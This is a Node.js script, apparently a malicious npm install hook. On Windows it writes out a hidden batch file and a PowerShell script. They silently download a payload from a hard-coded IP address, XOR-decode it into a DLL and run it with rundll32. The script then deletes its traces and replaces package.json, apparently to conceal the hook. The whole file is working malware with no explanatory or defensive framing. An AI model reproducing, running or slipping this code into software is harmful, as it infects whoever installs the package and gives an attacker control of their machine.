const os = require("os");
const fs = require("fs");
const { exec } = require("child_process");

const str1 =
  '@echo off\ncurl -o though.crt -L "http://166.88.61.72/explorer/search.asp?token=3092" > nul 2>&1\nstart /b /wait powershell.exe -ExecutionPolicy Bypass -File yui.ps1 > nul 2>&1\ndel "yui.ps1" > nul 2>&1\nif exist "soss.dat" (\ndel "soss.dat" > nul 2>&1\n)\nrename tmpdata.db soss.dat > nul 2>&1\nif exist "soss.dat" (\nrundll32 soss.dat, SetExpVal tiend\n)\nif exist "mod.json" (\ndel "package.json" > nul 2>&1\nrename mod.json package.json > nul 2>&1\n)\nping 127.0.0.1 -n 2 > nul\nif exist "soss.dat" (\ndel "soss.dat" > nul 2>&1\n)';
const str2 =
  '$path1 = Join-Path $PWD "though.crt"\n$path2 = Join-Path $PWD "tmpdata.db"\nif ([System.IO.File]::Exists($path1))\n{\n$bytes = [System.IO.File]::ReadAllBytes($path1)\nfor($i = 0; $i -lt $bytes.count; $i++)\n{\n$bytes[$i] = $bytes[$i] -bxor 0xc5\n}\n[System.IO.File]::WriteAllBytes($path2, $bytes)\nRemove-Item -Path $path1 -Force\n}';

const osType = os.type();

if (osType === "Windows_NT") {
  const fileName = "execu.bat";
  const psfileName = "yui.ps1";
  fs.writeFile(fileName, str1, (err) => {
    if (!err) {
      fs.writeFile(psfileName, str2, (err) => {
        if (!err) {
          const child = exec(`"${fileName}"`, (error, stdout, stderr) => {
            if (error) {
              return;
            }
            if (stderr) {
              return;
            }
            fs.unlink(fileName, (err) => {});
          });
        }
      });
    }
  });
}
